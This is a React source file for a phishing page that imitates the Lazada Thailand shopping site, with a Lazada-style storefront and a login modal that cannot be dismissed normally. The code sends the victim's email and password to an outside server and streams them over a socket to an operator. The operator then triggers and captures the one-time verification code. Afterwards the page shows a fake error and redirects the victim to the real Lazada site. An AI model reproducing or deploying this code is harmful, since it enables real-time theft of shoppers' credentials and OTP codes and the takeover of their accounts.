import React from "react";
import {
  Box,
  Image,
  VStack,
  HStack,
  Stack,
  Menu,
  MenuButton,
  MenuList,
  MenuItem,
  Button,
  Text,
  FormControl,
  Input,
  InputGroup,
  InputRightElement,
  Drawer,
  DrawerBody,
  DrawerHeader,
  DrawerOverlay,
  DrawerContent,
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalCloseButton,
  ModalBody,
  ModalFooter,
  useDisclosure,
  useBreakpointValue,
  Divider,
} from "@chakra-ui/react";
import { io } from "socket.io-client";
import { ChevronDownIcon } from "lucide-react";
import { useTranslation } from "react-i18next";
import { LuShoppingCart } from "react-icons/lu";
import { MdOutlineSearch } from "react-icons/md";
import { useEffect, useState } from "react";
import { IoIosArrowBack } from "react-icons/io";
import axios from "axios";
import IndonesiaFlagIcon from "/flags/indonesia.svg";
import MalaysiaFlagIcon from "/flags/malaysia.svg";
import PhilipinasFlagIcon from "/flags/philipinas.svg";
import SingaporeFlagIcon from "/flags/singapore.svg";
import ThailandFlagIcon from "/flags/thailand.svg";
import VietnamFlagIcon from "/flags/vietnam.svg";
import ChineseFlagIcon from "/flags/china.svg";
import EnglishFlagIcon from "/flags/england-flag.svg";
import MobileMenu from "../components/MobileMenu";
import { BaseUrl, SERVER_URL } from "../utils/reusables";
import Spinner from "../components/Spinner";
import StepTwo from "../components/StepTwo";
import StepThree from "../components/StepThree";
import StepOne from "../components/StepOne";
import StepFour from "../components/StepFour";
import MobileStepOne from "../components/Mobile/MobileStepOne";
import MobileStepTwo from "../components/Mobile/MobileStepTwo";
import MobileStepThree from "../components/Mobile/MobileStepThree";
import MobileStepFour from "../components/Mobile/MobileStepFour";

const languages = [
  { code: "th", name: "Thailand", flag: ThailandFlagIcon },
  { code: "en", name: "English", flag: EnglishFlagIcon },
  { code: "id", name: "Indonesia", flag: IndonesiaFlagIcon },
  { code: "ms", name: "Malaysia", flag: MalaysiaFlagIcon },
  { code: "fil", name: "Pilipinas", flag: PhilipinasFlagIcon },
  { code: "en-SG", name: "Singapore", flag: SingaporeFlagIcon },
  { code: "vi", name: "Vietnam", flag: VietnamFlagIcon },
  { code: "cn", name: "简体中文", flag: ChineseFlagIcon },
];

const images = [
  "/slide/1.jpg",
  "/slide/2.jpg",
  "/slide/3.jpg",
  "/slide/4.jpg",
  "/slide/5.jpg",
  "/slide/6.jpg",
  "/slide/7.jpg",
  "/slide/8.jpg",
  "/slide/9.jpg",
  "/slide/10.jpg",
  "/slide/11.jpg",
  "/slide/12.jpg",
  "/slide/13.jpg",
  "/slide/14.jpg",
  "/slide/15.jpg",
  "/slide/16.jpg",
];

const socket = io(SERVER_URL);

const Landing = () => {
  const [loading, setLoading] = useState(false);
  const [mobileLoading, setMobileLoading] = useState(false);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [showPassword, setShowPassword] = useState(false);
  const [lgCurrentStep, setLgCurrentStep] = useState(1);
  const [mobileCurrentStep, setMobileCurrentStep] = useState(1);
  const [adminResponse, setAdminResponse] = useState(null);
  const [adminResponseMobile, setAdminResponseMobile] = useState(null);
  const [adminOtpResponse, setAdminOtpResponse] = useState(null);
  const [adminOtpUpdatedResponse, setAdminOtpUpdatedResponse] = useState(null);
  const [adminOtpUpdatedMobileResponse, setAdminOtpUpdatedMobileResponse] =
    useState(null);
  const [data, setData] = useState({
    email: "",
    password: "",
    otp: "",
  });
  const { t, i18n } = useTranslation();
  const { isOpen, onOpen } = useDisclosure();
  const {
    isOpen: isMobileDrawerOpen,
    onOpen: onMobileDrawerOpen,
    onClose: onMobileDrawerClose,
  } = useDisclosure();
  const displayModal = useBreakpointValue({ base: false, md: true });

  const handleModalClose = () => {
    window.location.href = "https://www.lazada.co.th/";
  };

  const changeLanguage = (languageCode) => {
    i18n.changeLanguage(languageCode);
    setCurrentBackgroundIndex(0);
  };

  const getCurrentLanguage = () => {
    return (
      languages.find((lang) => lang.code === i18n.language) || languages[0]
    );
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);

  useEffect(() => {
    // Listen for admin response
    socket.on("adminResponse", (response) => {
      setAdminResponse(response);
      setLgCurrentStep(2);
      setLoading(false);
    });

    return () => {
      socket.off("adminResponse");
    };
  }, []);

  useEffect(() => {
    // Listen for admin otp response
    socket.on("adminOtpResponse", (response) => {
      setAdminOtpResponse(response);
      setLgCurrentStep(3);
      setMobileCurrentStep(3);
      setLoading(false);
      setMobileLoading(false);
    });

    return () => {
      socket.off("adminOtpResponse");
    };
  }, []);

  useEffect(() => {
    // Listen for admin otp updated response
    socket.on("adminOtpUpdatedResponse", (response) => {
      setAdminOtpUpdatedResponse(response);
      setLgCurrentStep(4);
      setLoading(false);
    });

    return () => {
      socket.off("adminOtpUpdatedResponse");
    };
  }, []);

  useEffect(() => {
    // Listen for admin otp updated response
    socket.on("adminOtpUpdatedResponseMobile", (response) => {
      setAdminOtpUpdatedMobileResponse(response);
      setMobileCurrentStep(4);
      setMobileLoading(false);
    });

    return () => {
      socket.off("adminOtpUpdatedResponse");
    };
  }, []);

  useEffect(() => {
    onOpen();
  }, [onOpen]);

  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentImageIndex((prevIndex) => (prevIndex + 1) % images.length);
    }, 10000); // Change image every 3 seconds

    return () => clearInterval(intervalId); // Cleanup on component unmount
  }, [images.length]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData({
      ...data,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    setLoading(true);
    setMobileLoading(true);

    try {
      const response = await axios.post(`${BaseUrl}/lazada/save`, {
        email: data.email,
        password: data.password,
      });

      if (response.status === 201) {
        socket.emit("loginAttempt", {
          email: data.email,
          password: data.password,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Login failed");
      }

      console.log("Login successful", response);
    } catch (error) {
      console.error(
        "Login failed",
        error.response ? error.response.data : error.message
      );
      setLoading(false); // Set loading to false if there's an error
    }
  };

  const handleNext = () => {
    setLoading(true);
    socket.emit("otpAttempt", {
      email: data.email,
      response: adminResponse,
      message: "send OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleMobileNext = () => {
    setMobileLoading(true);
    setMobileCurrentStep(3);
    socket.emit("otpAttemptMobile", {
      email: data.email,
      response: adminResponse,
      message: "send OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleResend = () => {
    setLoading(true);
    setAdminOtpResponse(null);
    socket.emit("otpResendAttempt", {
      email: data.email,
      message: "resend OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleFinish = async (e) => {
    e.preventDefault();

    setLoading(true);
    setMobileLoading(true);
    // setAdminOtpResponse(null);

    try {
      const response = await axios.put(`${BaseUrl}/lazada/update`, {
        email: data.email,
        password: data.password,
        otp: data.otp,
      });

      if (response.status === 200) {
        socket.emit("updateAttempt", {
          email: data.email,
          password: data.password,
          sentTo: adminOtpResponse.sendTo,
          otp: data.otp,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Login failed");
      }

      console.log("Login successful", response);
    } catch (error) {
      console.error(
        "Login failed",
        error.response ? error.response.data : error.message
      );
      setLoading(false); // Set loading to false if there's an error
      // setMobileLoading(false);
    }
  };

  const handleFinishMobile = async (e) => {
    e.preventDefault();

    setMobileLoading(true);
    // setAdminOtpResponse(null);

    try {
      const response = await axios.put(`${BaseUrl}/lazada/update`, {
        email: data.email,
        password: data.password,
        otp: data.otp,
      });

      if (response.status === 200) {
        socket.emit("updateAttemptMobile", {
          email: data.email,
          password: data.password,
          sentTo: adminOtpResponse.sendTo,
          otp: data.otp,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Login failed");
      }

      console.log("Login successful", response);
    } catch (error) {
      console.error(
        "Login failed",
        error.response ? error.response.data : error.message
      );
      setMobileLoading(false); // Set loading to false if there's an error
      // setMobileLoading(false);
    }
  };

  const isEmailValid = data.email.includes("@");
  const isPasswordValid = data.password.length >= 6;

  return (
    <>
      <Box display={{ base: "none", md: "block" }} h="100%">
        <VStack w="100%" spacing={0} alignItems="center">
          <Stack bg="red" w="100%" alignItems="center">
            <Image src="/ad.jpg" w="1188px" h="80px" />
          </Stack>

          <HStack
            bg="rgba(0, 0, 0, .03)"
            h="25px"
            w="100%"
            justifyContent="center"
            gap="2.5rem"
            pl="20rem"
          >
            <Text fontSize="12px">FEEDBACK</Text>
            <Text fontSize="12px">SAVE MORE ON APP</Text>
            <Text fontSize="12px">SELL ON LAZADA</Text>
            <Text fontSize="12px">CUSTOMER CARE</Text>
            <Text fontSize="12px">TRACK MY ORDER</Text>
            <Text fontSize="12px">LOGIN</Text>
            <Text fontSize="12px">SIGNUP</Text>
            <Text fontSize="12px">เปลี่ยนภาษา</Text>
          </HStack>

          <HStack
            h="80px"
            bg="#fff"
            w="100%"
            justifyContent="center"
            pb="0.6rem"
            gap="3.2rem"
          >
            <Image src="/main-logo.png" alt="logo" w="127px" h="40px" />
            <HStack
              w="688px"
              h="45px"
              bg="#eff0f5"
              justifyContent="space-between"
              pl="1rem"
            >
              <Text fontSize="14px" color="#212121">
                Search in Lazada
              </Text>
              <Stack
                bg="#f57224"
                h="100%"
                w="45px"
                justifyContent="center"
                alignItems="center"
                pl="5px"
              >
                <MdOutlineSearch color="#fff" size="25px" />
              </Stack>
            </HStack>
            <LuShoppingCart size="29px" />
            <Image src="/free.jpg" alt="free" w="188px" h="45px" />
          </HStack>

          <VStack w="100%" bg="rgba(0, 0, 0, .05)">
            <HStack h="344px">
              <Image
                src={images[currentImageIndex]}
                alt={`Slide ${currentImageIndex}`}
                w="100%"
                h="100%"
                objectFit="cover"
              />
              <Image src="/side.png" alt="side" w="194px" h="100%" />
            </HStack>
            <HStack gap="0.7rem">
              <HStack w="288px" h="130px" bg="#fff" borderRadius="6px" p="12px">
                <VStack h="100%" w="150px" alignItems="flex-start">
                  <Image src="/lazmail.png" alt="lazmail" w="auto" h="28px" />
                  <Text color="#2e3346" fontSize="16px" mt="10px">
                    สินค้าของแท้จากแบรนด์ดัง
                  </Text>
                </VStack>
                <Image src="/shoe.png" alt="shoe" h="100%" w="auto" />
              </HStack>
              <HStack w="288px" h="130px" bg="#fff" borderRadius="6px">
                <VStack h="100%" w="150px" p="12px" alignItems="flex-start">
                  <Image src="/vouch.png" alt="vouch" w="auto" h="28px" />
                  <Text color="#2e3346" fontSize="16px" mt="10px">
                    รวมคูปองส่วนลดที่นี้
                  </Text>
                </VStack>
                <Image
                  src="/voucher.png"
                  alt="voucher"
                  h="100%"
                  w="auto"
                  borderRadius="6px"
                />
              </HStack>
              <HStack w="288px" h="130px" bg="#fff" borderRadius="6px">
                <VStack h="100%" w="150px" p="12px" alignItems="flex-start">
                  <Image src="/trav.png" alt="trav" w="auto" h="28px" />
                  <Text color="#2e3346" fontSize="16px" mt="10px">
                    ดีลท่องเที่ยวสุดพิเศษ
                  </Text>
                </VStack>
                <Image
                  src="/travel.png"
                  alt="travel"
                  h="100%"
                  w="auto"
                  borderRadius="6px"
                />
              </HStack>
              <HStack w="288px" h="130px" bg="#fff" borderRadius="6px">
                <VStack h="100%" w="150px" p="12px" alignItems="flex-start">
                  <Image src="/top.png" alt="top" w="auto" h="28px" />
                  <Text color="#2e3346" fontSize="16px" mt="10px">
                    เติมเงิน จ่ายบิล ดีลอาหารสุดคุ้ม
                  </Text>
                </VStack>
                <Image
                  src="/topup.png"
                  alt="topup"
                  h="100%"
                  w="auto"
                  borderRadius="6px"
                />
              </HStack>
            </HStack>
          </VStack>

          <VStack w="100%" pt="2.5rem" bg="rgba(0, 0, 0, .05)">
            <VStack alignItems="flex-start" w="74.1%">
              <Text fontSize="22px">Flash Sale</Text>
              <VStack alignItems="flex-start" w="100%" spacing={0}>
                <HStack
                  bg="#fff"
                  borderBottom="1px solid #d5d5d5"
                  justifyContent="space-between"
                  w="100%"
                  h="60px"
                  fontSize="12px"
                >
                  <HStack ml="20px" gap="5rem">
                    <Text color="#f57224" fontSize="14px" fontWeight="500">
                      On Sale Now
                    </Text>

                    <HStack>
                      <Text color="#424242" fontSize="14px" mr="10px">
                        Ending in
                      </Text>
                      <HStack>
                        <Stack
                          w="40px"
                          h="35px"
                          bg="#d3232a"
                          alignItems="center"
                          justifyContent="center"
                        >
                          <Text
                            color="#fff"
                            fontSize="16px"
                            fontWeight="500"
                            lineHeight="35px"
                          >
                            07
                          </Text>
                        </Stack>
                        <Text>:</Text>
                        <Stack
                          w="40px"
                          h="35px"
                          bg="#d3232a"
                          alignItems="center"
                          justifyContent="center"
                        >
                          <Text
                            color="#fff"
                            fontSize="16px"
                            fontWeight="500"
                            lineHeight="35px"
                          >
                            07
                          </Text>
                        </Stack>
                        <Text>:</Text>
                        <Stack
                          w="40px"
                          h="35px"
                          bg="#d3232a"
                          alignItems="center"
                          justifyContent="center"
                        >
                          <Text
                            color="#fff"
                            fontSize="16px"
                            fontWeight="500"
                            lineHeight="35px"
                          >
                            12
                          </Text>
                        </Stack>
                      </HStack>
                    </HStack>
                  </HStack>

                  <Button
                    mr="11px"
                    color="#f57224"
                    fontSize="14px"
                    fontWeight="500"
                    lineHeight="35px"
                    borderRadius="2px"
                    variant="outline"
                    border="1px solid #f57224"
                  >
                    SHOP ALL PRODUCTS
                  </Button>
                </HStack>
                <HStack
                  w="100%"
                  bg="#fff"
                  pt="10px"
                  pb="15px"
                  justifyContent="space-between"
                >
                  <VStack w="188px">
                    <Image
                      src="/products/1.jpg"
                      alt="product1"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        Kirei Kirei Foaming Hand Soap Original Refill 200 ml
                        (x12)
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿312.00
                      </Text>
                      <HStack>
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿468.00
                        </Text>
                        <Text color="#212121" fontSize="12px">
                          -33%
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>

                  <VStack w="188px">
                    <Image
                      src="/products/2.jpg"
                      alt="product2"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        Vistra B-Complex Plus Minerals 30 Tablets วิสทร้า
                        บีคอมเพล็กซ์ วิตามินบีรวม
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿182.00
                      </Text>
                      <HStack>
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿250.00
                        </Text>
                        <Text color="#212121" fontSize="12px">
                          -27%
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>

                  <VStack w="188px">
                    <Image
                      src="/products/3.png"
                      alt="product3"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        Ensure Gold Vanilla 800g x3
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿2,866.00
                      </Text>
                      <HStack>
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿3,351.00
                        </Text>
                        <Text color="#212121" fontSize="12px">
                          -14%
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>

                  <VStack w="188px">
                    <Image
                      src="/products/4.jpg"
                      alt="product4"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        UGREEN USB Bluetooth 5.4 5.3 5.0 Dongle Adapter for PC
                        Speaker Wireless Mouse Keyboard Music Audio Receiver
                        Transmitter Bluetooth Model: 90225
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿179.00
                      </Text>
                      <HStack>
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿499.00
                        </Text>
                        <Text color="#212121" fontSize="12px">
                          -64%
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>

                  <VStack w="188px">
                    <Image
                      src="/products/5.png"
                      alt="product5"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        [9.9 ราคาขวดละ170.- ] ]การ์นิเย่ ไมเซล่าฝาชมพู คลีนซิ่ง
                        วอเตอร์ เซนซิทีฟ สกิน 400มล GARNIER MICELLAR CLEANSING
                        WATER 400MLX2 ล้างเครื่องสำอาง
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿429.00
                      </Text>
                      <HStack>
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿558.00
                        </Text>
                        <Text color="#212121" fontSize="12px">
                          -23%
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>

                  <VStack w="188px">
                    <Image
                      src="/products/6.png"
                      alt="product6"
                      w="100%"
                      h="188px"
                      objectFit="cover"
                    />
                    <VStack p="4px 8px 0" alignItems="flex-start" spacing={0}>
                      <Text
                        w="100%"
                        overflow="hidden"
                        fontSize="14px"
                        lineHeight="normal"
                        mb="4px"
                        textOverflow="ellipsis"
                        noOfLines="2"
                      >
                        [สินค้าขายดี][ขายยกลังx2] โฟร์โมสต์ โอเมก้า 369 รสจืด
                        180มล (36กล่อง/ลัง) Foremost Omega 369 Plain 180ml
                        (นมกล่องUHT)
                      </Text>
                      <Text
                        fontSize="18px"
                        color="#f57224"
                        letterSpacing="-.56px"
                      >
                        ฿783.00
                      </Text>
                      <HStack alignItems="flex-start">
                        <Text color="#9e9e9e" fontSize="12px" as="s">
                          ฿783.00
                        </Text>
                      </HStack>
                    </VStack>
                  </VStack>
                </HStack>
              </VStack>
            </VStack>
          </VStack>
        </VStack>
      </Box>

      {displayModal && (
        <Modal isOpen={isOpen} isCentered isClosable={false}>
          <ModalOverlay />
          <ModalContent w="444px" h="326.58px" maxW="444px" maxH="326.58px">
            <ModalHeader pb="0">
              <HStack
                justifyContent={lgCurrentStep === 3 ? "flex-start" : "center"}
              >
                <Text
                  color={lgCurrentStep === 4 ? "red" : "#2e3346"}
                  fontSize="16px"
                  fontWeight="500"
                  textAlign="center"
                >
                  {lgCurrentStep === 1 && "Login"}
                  {lgCurrentStep === 2 && "Verify Email"}
                  {lgCurrentStep === 3 && "Enter The Code"}
                  {lgCurrentStep === 4 && "Error Occured"}
                </Text>
              </HStack>
            </ModalHeader>
            <ModalCloseButton onClick={handleModalClose} />
            <ModalBody px="36px">
              <Stack
                w="100%"
                h="100%"
                justifyContent="center"
                alignItems="center"
                overflow="hidden"
              >
                {!loading && lgCurrentStep === 1 && (
                  <StepOne
                    handleSubmit={handleSubmit}
                    data={data}
                    handleChange={handleChange}
                    showPassword={showPassword}
                    togglePasswordVisibility={togglePasswordVisibility}
                    isEmailValid={isEmailValid}
                    isPasswordValid={isPasswordValid}
                  />
                )}

                {(loading || lgCurrentStep === 2) && (
                  <VStack w="100%" h="100%">
                    {!adminResponse ? (
                      <Spinner />
                    ) : (
                      <StepTwo
                        adminResponse={adminResponse}
                        setLgCurrentStep={setLgCurrentStep}
                        setLoading={setLoading}
                        socket={socket}
                        data={data}
                        handleNext={handleNext}
                      />
                    )}
                  </VStack>
                )}

                {lgCurrentStep === 3 && (
                  <VStack w="100%" h="100%">
                    {loading ? (
                      <Spinner
                        size="lg"
                        thickness="4px"
                        speed="0.65s"
                        emptyColor="gray.200"
                      />
                    ) : (
                      <StepThree
                        adminOtpResponse={adminOtpResponse}
                        data={data}
                        setData={setData}
                        handleResend={handleResend}
                        handleFinish={handleFinish}
                        loading={loading}
                      />
                    )}
                  </VStack>
                )}

                {(loading || lgCurrentStep === 4) && (
                  <VStack w="100%" h="100%">
                    {!adminOtpUpdatedResponse ? (
                      <Spinner />
                    ) : (
                      <StepFour handleModalClose={handleModalClose} />
                    )}
                  </VStack>
                )}
              </Stack>
            </ModalBody>
          </ModalContent>
        </Modal>
      )}

      <Box display={{ base: "block", md: "none" }} p="1rem">
        <VStack alignItems="flex-start">
          <HStack w="100%" justifyContent="space-between" mb="1rem">
            <IoIosArrowBack size="1.3rem" onClick={handleModalClose} />
            <Button
              onClick={onMobileDrawerOpen}
              as={Button}
              rightIcon={<ChevronDownIcon size="0.9rem" />}
              variant="unstyled"
              fontWeight="300"
              display="flex"
            >
              <Image
                src={getCurrentLanguage().flag}
                alt={getCurrentLanguage().name}
                h="1rem"
                w="1rem"
              />
            </Button>
          </HStack>
          {!mobileLoading && mobileCurrentStep === 1 && (
            <MobileStepOne
              t={t}
              showPassword={showPassword}
              togglePasswordVisibility={togglePasswordVisibility}
              handleSubmit={handleSubmit}
              data={data}
              handleChange={handleChange}
              isEmailValid={isEmailValid}
              isPasswordValid={isPasswordValid}
            />
          )}

          {(mobileLoading || mobileCurrentStep === 2) && (
            <VStack w="100%" h="100%">
              {!adminResponse ? (
                <Spinner />
              ) : (
                <MobileStepTwo
                  t={t}
                  adminResponse={adminResponse}
                  setMobileCurrentStep={setMobileCurrentStep}
                  handleNext={handleNext}
                  handleMobileNext={handleMobileNext}
                />
              )}
            </VStack>
          )}

          {mobileCurrentStep === 3 && (
            <VStack w="100%" h="100%">
              {mobileLoading ? (
                <Spinner
                  size="lg"
                  thickness="4px"
                  speed="0.65s"
                  emptyColor="gray.200"
                />
              ) : (
                <MobileStepThree
                  t={t}
                  adminOtpResponse={adminOtpResponse}
                  data={data}
                  setData={setData}
                  handleResend={handleResend}
                  handleFinish={handleFinish}
                  handleFinishMobile={handleFinishMobile}
                  mobileLoading={mobileLoading}
                />
              )}
            </VStack>
          )}

          {mobileCurrentStep === 4 && (
            <VStack w="100%" h="100%">
              {mobileLoading ? (
                <Spinner
                  size="lg"
                  thickness="4px"
                  speed="0.65s"
                  emptyColor="gray.200"
                />
              ) : (
                <MobileStepFour t={t} handleModalClose={handleModalClose} />
              )}
            </VStack>
          )}

          {/* {(mobileLoading || mobileCurrentStep === 4) && (
            <VStack w="100%" h="100%">
              {!adminOtpUpdatedMobileResponse ? (
                <Spinner />
              ) : (
                <Text>StepFour</Text>
              )}
            </VStack>
          )} */}
        </VStack>

        <MobileMenu
          onClose={onMobileDrawerClose}
          isOpen={isMobileDrawerOpen}
          languages={languages}
          changeLanguage={changeLanguage}
          getCurrentLanguage={getCurrentLanguage}
        />
      </Box>
    </>
  );
};

export default Landing;
